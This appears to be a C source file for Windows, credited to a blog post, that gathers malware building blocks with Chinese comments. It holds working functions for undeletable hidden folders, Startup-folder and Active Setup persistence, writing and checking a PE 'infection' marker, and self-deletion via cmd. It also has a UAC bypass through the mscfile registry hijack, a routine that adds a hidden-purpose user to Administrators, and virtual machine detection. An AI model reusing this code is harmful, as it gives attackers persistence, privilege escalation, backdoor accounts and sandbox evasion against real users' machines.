// https://www.cnblogs.com/LyShark/p/13420509.html

#include <stdio.h>
#include <stddef.h>
#include <shlobj.h>
#include <assert.h>
#include <cpuid.h>
#include <lm.h>
#include <windows.h>
#define VIRUSFLAGS 0xCCCC
#pragma comment(lib, "shell32.lib")
#pragma comment(lib,"netapi32")


int test() {return 1;}


// 添加不可删除文件
BOOL SetImmunity(char *FilePath,char *FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	BOOL bRet = CreateDirectory(file, 0);
	if (bRet)
	{
		// 创建无法删除的文件夹
		strcat(file, "\\anti...\\");
		bRet = CreateDirectory(file, 0);
		if (bRet)
		{
			// 设置文件为隐藏属性
			SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
			return TRUE;
		}
	}
	return FALSE;
}

// 删除无法删除文件
void ClearImmunity(char *FilePath, char *FileName)
{
	char file[2048] = { 0 };

	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);

	strcat(file, "\\anti...\\");
	RemoveDirectory(file);

	ZeroMemory(file, MAX_PATH);
	strncpy(file, FilePath, strlen(FilePath));
	strcat(file, FileName);
	RemoveDirectory(file);
}

/*
int main(int argc, char * argv[])
{
	// 创建 autorun.inf 可免疫自动播放
	char *Fuck[4] = { "你", "好", "世", "界" };
	int FuckLen = sizeof(Fuck) / sizeof(int);

	TCHAR Destop[MAX_PATH];
	SHGetSpecialFolderPath(0, Destop, CSIDL_DESKTOP, FALSE);	 // 获取桌面绝对路径

	for (int x = 0; x < FuckLen; x++)
	{
		SetImmunity("c://", Fuck[x]);
		//ClearImmunity("c://", Fuck[x]);
	}

	system("pause");
	return 0;
}*/


BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName)
{
	char szStartupPath[MAX_PATH] = { 0 };
	char szDestFilePath[MAX_PATH] = { 0 };

	// 获取快速启动目录路径
	SHGetSpecialFolderPath(0, szStartupPath, CSIDL_STARTUP, TRUE);
	printf("快速启动路径: %s\n", szStartupPath);
	// 构造拷贝的目的文件路径
	wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
	// 拷贝文件到快速启动目录下
	CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
	return TRUE;
}

/*
int main(int argc, char * argv[])
{
	AutoRun_Startup("c://main.exe", "main.exe");
	system("pause");
	return 0;
}
*/


// 向指定文件写入感染标志
BOOL WriteSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{
	DWORD dwNum = 0;
	SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
	WriteFile(hFile, &dwSig, sizeof(DWORD), &dwNum, 0);
	return TRUE;
}
// 检查文件是否被感染
BOOL CheckSig(DWORD dwAddr, DWORD dwSig, HANDLE hFile)
{
	DWORD dwSigNum = 0;
	DWORD dwNum = 0;
	SetFilePointer(hFile, dwAddr, 0, FILE_BEGIN);
	ReadFile(hFile, &dwSigNum, sizeof(DWORD), &dwNum, 0);

	if (dwSigNum == dwSig)
		return TRUE;
	return FALSE;
}

/*
int main(int argc, char* argv[])
{
	HANDLE hFile,hMap = 0;
	LPVOID lpBase = 0;

	hFile = CreateFile("c://1.exe",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	hMap = CreateFileMapping(hFile,0,PAGE_READWRITE,0,0,0);
	lpBase = MapViewOfFile(hMap,FILE_MAP_READ | FILE_MAP_WRITE,0,0,0);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
	PIMAGE_NT_HEADERS pNtHeader = 0;
	PIMAGE_SECTION_HEADER pSec = 0;
	IMAGE_SECTION_HEADER imgSec = { 0 };

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("文件非可执行文件 \n");
		return -1;
	}
	pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);
	// 写入感染标志
	WriteSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile);

	// 返回真说明感染过
	if (CheckSig(offsetof(IMAGE_DOS_HEADER, e_cblp), VIRUSFLAGS, hFile))
	{
		printf("文件已被感染,无法重复感染. \n");
	}

	system("pause");
	return 0;
}
*/


BOOL SelfDel()
{
	SHELLEXECUTEINFO sei;
	TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];

	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpy(szParams, "/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		// 设置结构成员.
		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0; sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		// 创建cmd进程.
		if (ShellExecuteEx(&sei))
		{
			// 设置cmd进程的执行级别为空闲执行,使本程序有足够的时间从内存中退出.
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
			// 将自身进程的优先级置高
			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
			// 通知Windows资源浏览器,本程序文件已经被删除.
			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return TRUE;
		}
	}
	return FALSE;
}

/*
int main(int argc, char* argv[])
{
	SelfDel();
	return 0;
}
*/


//关闭UAC
BOOL CloseUAC(char *lpszExePath)
{
	HKEY hKey = 0;
	// 创建项
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 
		0, 0, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, 0, &hKey, 0);
	if (0 == hKey)
	{
		return FALSE;
	}
	RegSetValueEx(hKey, 0, 0, REG_SZ, (BYTE *)lpszExePath, (1 + lstrlen(lpszExePath)));
	RegCloseKey(hKey);
	return TRUE;
}

/*
int main(int argc,char *argv[])
{
	BOOL bRet = FALSE;
	PVOID OldValue = 0;

	// 关闭文件重定位
	Wow64DisableWow64FsRedirection(&OldValue);

	// 修改注册表
	bRet = CloseUAC("C:\\Windows\\System32\\cmd.exe");
	printf("已关闭 \n");
	// 恢复文件重定位
	Wow64RevertWow64FsRedirection(OldValue);

	system("pause");
	return 0;
}
*/


// 添加恶意系统用户
void AddUser(LPWSTR UserName, LPWSTR Password)
{
	USER_INFO_1 user;
	user.usri1_name = UserName;
	user.usri1_password = Password;
	user.usri1_priv = USER_PRIV_USER;
	user.usri1_home_dir = 0;
	user.usri1_comment = 0;
	user.usri1_flags = UF_SCRIPT;
	user.usri1_script_path = 0;

	//添加名为lysharks的用户,密码为sswordQq123 
	if (NetUserAdd(0, 1, (LPBYTE)&user, 0) == NERR_Success)
		printf("创建用户完成 \n");

	// 添加用户到administrators组
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = user.usri1_name;
	if (NetLocalGroupAddMembers(0, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
		printf("添加到组完成 \n");
}

// 枚举系统用户
void EnumUser()
{
	LPUSER_INFO_0 pBuf = 0;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResumeHandle = 0;
	DWORD i;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = 0;
	do
	{
		nStatus = NetUserEnum((LPCWSTR)pszServerName, dwLevel, FILTER_NORMAL_ACCOUNT,
			(LPBYTE*)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != 0)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					assert(pTmpBuf != 0);

					if (pTmpBuf == 0)
					{
						break;
					}
					wprintf(L"%s\n", pTmpBuf->usri0_name, pTmpBuf);
					pTmpBuf++;
				}
			}
		}
		if (pBuf != 0)
		{
			NetApiBufferFree(pBuf);
			pBuf = 0;
		}
	} while (nStatus == ERROR_MORE_DATA);
	NetApiBufferFree(pBuf);
}


/*
int main(int argc, char *argv[])
{
	AddUser(L"lyshark", L"123123");
	EnumUser();

	system("pause");
	return 0;
}
*/







// 修改或创建字符串类型的键值
void CreateStringReg(HKEY hRoot, LPCWSTR szSubkey, LPCWSTR ValueName, LPCWSTR Data)
{
    // 创建新的注册表键
    HKEY hKey;
    long lRet = RegCreateKeyExW(hRoot, szSubkey, 0, 0,
                                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hKey, 0);
    if (ERROR_SUCCESS != lRet)
        return;
    // 修改或创建注册表键值
    lRet = RegSetValueExW(hKey, ValueName, 0, REG_SZ, (BYTE*)Data, (wcslen(Data) + 1) * sizeof(wchar_t));
    if (ERROR_SUCCESS != lRet)
        return;
    // 释放注册表键句柄
    RegCloseKey(hKey);
}

// 创建开机自启动进程
// 计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components
// 注册一条类似{84B421CD-B018-2513-B0B1-5C76DEF70F20}的子建，然后子键中新建StubPath的值项
void CreateAutoRun()
{
    HKEY hKey;
    DWORD dwDpt = REG_OPENED_EXISTING_KEY;
    // 清理一下
    RegDeleteKeyW(HKEY_CURRENT_USER,
                  L"Software\\Microsoft\\Active Setup\\Installed Components\\{84B421CD-B018-2513-B0B1-5C76DEF70F20}");
    // 打开注册表键值
    long lRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                              L"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{84B421CD-B018-2513-B0B1-5C76DEF70F20}",
                              REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &hKey);
    if (lRet != ERROR_SUCCESS)
    {
        WCHAR SelfFile[MAX_PATH];
        WCHAR SystemPath[MAX_PATH + 20];
        // 获取系统目录
        GetSystemDirectoryW(SystemPath, MAX_PATH);
        // 在系统目录与\\activexrun.exe连接
        wcscat_s(SystemPath, MAX_PATH / sizeof(WCHAR), L"\\main.exe");
        // 获取当前进程路径
        GetModuleFileNameW(0, SelfFile, MAX_PATH);
        // main.exe复制到C:\windows\system32目录下
        CopyFileW(SelfFile, SystemPath, FALSE);
        // 写注册表
        CreateStringReg(HKEY_LOCAL_MACHINE,
                        L"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{84B421CD-B018-2513-B0B1-5C76DEF70F20}",
                        L"StubPath", SystemPath);
    }
}

BOOL IsVMWare()
{
    unsigned int cpuInfo[4];
    // 使用 __get_cpuid 替代 __cpuid
    if (__get_cpuid(1, &cpuInfo[0], &cpuInfo[1], &cpuInfo[2], &cpuInfo[3])) {
        return ((cpuInfo[2] >> 31) & 1) == 1;
    }
    return 0;
}


/*
int main(int argc, char *argv[])
{
    CreateAutoRun();
    system("pause");
    return 0;
}*/